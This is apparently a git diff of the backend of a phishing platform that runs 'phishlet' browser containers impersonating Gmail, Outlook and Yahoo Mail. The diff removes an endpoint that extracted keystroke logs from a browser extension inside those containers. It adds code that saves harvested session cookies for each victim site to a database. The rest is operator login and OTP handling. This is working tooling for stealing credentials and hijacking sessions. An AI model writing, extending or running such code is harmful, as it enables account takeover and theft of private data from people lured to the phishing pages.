@@ -78,8 +78,7 @@ app.add_middleware(
 PHISHLETS = {
     "gmail": {"label": "Gmail", "url": "https://gmail.com", "port": 5801, "redirect_url": "https://web.whatsapp.com"},
     "outlook": {"label": "Outlook", "url": "https://outlook.com", "port": 5802, "redirect_url": ""},
-    "facebook": {"label": "Facebook", "url": "https://facebook.com", "port": 5803, "redirect_url": ""},
-    "instagram": {"label": "Instagram", "url": "https://instagram.com", "port": 5804, "redirect_url": ""},
+    "yahoo": {"label": "Yahoo Mail", "url": "https://mail.yahoo.com", "port": 5803, "redirect_url": ""},
 }
 
 
@@ -304,7 +303,7 @@ async def resend_otp(body: VerifyOtpRequest):
     if not user:
         raise HTTPException(status_code=404, detail="User not found")
     if user.get("verified"):
-        raise HTTPException(status_code=400, detail="Already verified")
+        return {"message": "Already verified"}
 
     otp = generate_otp()
     await db.users.update_one(
@@ -315,12 +314,37 @@ async def resend_otp(body: VerifyOtpRequest):
     return {"message": "OTP resent"}
 
 
+@app.post("/api/auth/re-verify")
+async def re_verify(body: VerifyOtpRequest):
+    user = await db.users.find_one({"email": body.email})
+    if not user:
+        raise HTTPException(status_code=404, detail="User not found")
+    if not user.get("verified"):
+        return {"message": "User not verified yet"}
+
+    otp = generate_otp()
+    await db.users.update_one(
+        {"email": body.email},
+        {"$set": {"otp": otp, "otp_expires": datetime.now(timezone.utc) + timedelta(minutes=5)}},
+    )
+    await send_otp_email(body.email, otp)
+    return {"message": "OTP sent for re-verification"}
+
+
 @app.post("/api/auth/login")
 async def login(body: LoginRequest):
     user = await db.users.find_one({"email": body.email})
     if not user or not pwd_ctx.verify(body.password, user["password"]):
         raise HTTPException(status_code=401, detail="Invalid credentials")
     if not user.get("verified"):
+        if user.get("otp_expires") and user["otp_expires"].replace(tzinfo=timezone.utc) < datetime.now(timezone.utc):
+            otp = generate_otp()
+            await db.users.update_one(
+                {"email": body.email},
+                {"$set": {"otp": otp, "otp_expires": datetime.now(timezone.utc) + timedelta(minutes=5)}},
+            )
+            await send_otp_email(body.email, otp)
+            raise HTTPException(status_code=403, detail="OTP expired. New OTP sent to your email.")
         raise HTTPException(status_code=403, detail="Email not verified")
 
     token = create_token(body.email)
@@ -638,137 +662,13 @@ async def get_credentials(target: str = "", email: str = Depends(get_current_use
             return {"status": "success", "message": f"{name}\n{json.dumps(container_obj, indent=2)}"}
         output.append(f"{name}\n{json.dumps(container_obj, indent=2)}")
 
-    return {"status": "success", "message": "\n\n".join(output)}
-
-
-@app.get("/api/keylog")
-async def get_keylog(email: str = Depends(get_current_user)):
-    list_result = await run_docker([
-        "ps",
-        "--filter", "name=^/phishlet-",
-        "--format", "{{.Names}}",
-    ])
-    if list_result["status"] != "success":
-        return {"status": "error", "message": "Failed to list containers"}
-
-    names = [name.strip() for name in list_result["message"].strip().split("\n") if name.strip()]
-    if not names:
-        return {"status": "error", "message": "No browser containers running"}
-
-    script = (
-        "import sqlite3, re, struct\n"
-        "db = sqlite3.connect('/tmp/kl.sqlite')\n"
-        "cur = db.cursor()\n"
-        "cols = [row[1] for row in cur.execute('PRAGMA table_info(object_data)')]\n"
-        "col = 'value' if 'value' in cols else 'data'\n"
-        "\n"
-        "def parse_structured_clone(data):\n"
-        "    strings = []\n"
-        "    if len(data) < 8 or data[:4] != b'\\xff\\x00\\x00\\x00':\n"
-        "        return strings\n"
-        "    pos = 8\n"
-        "    while pos + 8 <= len(data):\n"
-        "        d = struct.unpack('<I', data[pos:pos+4])[0]\n"
-        "        t = struct.unpack('<I', data[pos+4:pos+8])[0]\n"
-        "        pos += 8\n"
-        "        if t == 0xFFFF0002:\n"
-        "            strings.append(data[pos:pos+d].decode('utf-8', errors='replace'))\n"
-        "            pos += d\n"
-        "        elif t == 0xFFFF0007:\n"
-        "            for _ in range(d):\n"
-        "                if pos + 8 > len(data):\n"
-        "                    break\n"
-        "                kd = struct.unpack('<I', data[pos:pos+4])[0]\n"
-        "                kt = struct.unpack('<I', data[pos+4:pos+8])[0]\n"
-        "                if kt != 0xFFFF0002:\n"
-        "                    break\n"
-        "                pos += 8 + kd\n"
-        "                if pos + 8 > len(data):\n"
-        "                    break\n"
-        "                vd = struct.unpack('<I', data[pos:pos+4])[0]\n"
-        "                vt = struct.unpack('<I', data[pos+4:pos+8])[0]\n"
-        "                pos += 8\n"
-        "                if vt == 0xFFFF0002:\n"
-        "                    strings.append(data[pos:pos+vd].decode('utf-8', errors='replace'))\n"
-        "                    pos += vd\n"
-        "    return strings\n"
-        "\n"
-        "for row in cur.execute(f'SELECT {col} FROM object_data'):\n"
-        "    blob = row[0]\n"
-        "    if not blob or b'<timestamp:' not in blob:\n"
-        "        continue\n"
-        "    strings = []\n"
-        "    if len(blob) >= 8 and blob[:4] == b'\\xff\\x00\\x00\\x00':\n"
-        "        strings = parse_structured_clone(blob)\n"
-        "    if not strings:\n"
-        "        idx = blob.find(b'<timestamp:')\n"
-        "        if idx >= 0:\n"
-        "            candidate = ''.join(chr(byte) for byte in blob[idx:] if 32 <= byte <= 126)\n"
-        "            if '<timestamp:' in candidate:\n"
-        "                strings = [candidate]\n"
-        "    for item in strings:\n"
-        "        if '<timestamp:' not in item:\n"
-        "            continue\n"
-        "        item = re.sub(r'<[^>]*?>', '', item)\n"
-        "        item = item.replace('<blank>', ' ')\n"
-        "        item = item.strip()\n"
-        "        if len(item) > 2:\n"
-        "            print(item)\n"
-    )
-
-    ls_script = (
-        "import json, os, glob\n"
-        "for d in glob.glob('/config/profile/storage/default moz-extension-*/ls'):\n"
-        "    dp = os.path.join(d, 'data.json')\n"
-        "    if not os.path.isfile(dp):\n"
-        "        continue\n"
-        "    try:\n"
-        "        with open(dp) as f:\n"
-        "            data = json.load(f)\n"
-        "        kl = data.get('storedkl') or data.get('keylog') or data.get('log')\n"
-        "        if kl:\n"
-        "            print(kl)\n"
-        "    except Exception:\n"
-        "        pass\n"
-    )
-
-    output = []
-    for name in names:
-        found = []
-
-        db_result = await run_docker([
-            "exec", name, "sh", "-c",
-            "find /config/profile/storage/default -path '*/moz-extension*/idb/*.sqlite' -type f 2>/dev/null",
-        ])
-        if db_result["status"] == "success" and db_result["message"].strip():
-            for db_path in db_result["message"].strip().split("\n"):
-                db_path = db_path.strip()
-                if not db_path:
-                    continue
-                decode = await run_docker([
-                    "exec", "-i", "-e", f"DB_PATH={db_path}", name, "sh", "-c",
-                    'cp "$DB_PATH" /tmp/kl.sqlite && python3 - 2>/dev/null && rm /tmp/kl.sqlite',
-                ], input_text=script)
-                msg = decode["message"].strip()
-                if decode["status"] == "success" and msg and msg != "[OK] Done.":
-                    found.append(msg)
-
-        ls_result = await run_docker([
-            "exec", name, "sh", "-c",
-            "ls /config/profile/storage/default moz-extension-*/ls/data.json 2>/dev/null",
-        ])
-        if ls_result["status"] == "success" and ls_result["message"].strip():
-            ls_decode = await run_docker([
-                "exec", name, "python3", "-c", ls_script,
-            ])
-            ls_msg = ls_decode["message"].strip()
-            if ls_decode["status"] == "success" and ls_msg and ls_msg != "[OK] Done.":
-                found.append(ls_msg)
-
-        if found:
-            output.append(f"{name}\n" + "\n".join(found))
-        else:
-            output.append(f"{name}\n(no keylog data)")
+        for host, cookies in container_obj.items():
+            for cookie_name, cookie_value in cookies.items():
+                await db.phishlet_credentials.update_one(
+                    {"container": name, "host": host, "name": cookie_name},
+                    {"$set": {"value": cookie_value, "updated_at": datetime.now(timezone.utc)}},
+                    upsert=True,
+                )
 
     return {"status": "success", "message": "\n\n".join(output)}
 
